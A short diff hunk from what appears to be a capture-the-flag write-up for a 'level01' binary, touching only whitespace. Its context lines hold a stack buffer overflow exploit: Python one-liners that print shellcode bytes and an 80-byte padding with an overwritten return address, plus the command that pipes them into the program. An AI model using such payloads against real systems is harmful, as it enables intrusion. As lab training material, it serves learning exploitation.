@@ -82,6 +82,6 @@ python -c "print 'dat_wil' + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/d
 python -c "print 'A'*80 + '\x47\xa0\x04\x08'" > file_1
 
 (gbd)   r < <(cat /tmp/file_0; sleep 1; cat /tmp/file_1; cat)
-(shell) (cat /tmp/file_0; sleep 1; cat /tmp/file_1; cat) | ./level01 
+(shell) (cat /tmp/file_0; sleep 1; cat /tmp/file_1; cat) | ./level01
 
 Working. So it seems we are unable to jump on adresses wich begins withs "0xffff" but we managed to jump on a "0x0804" one. Good to know
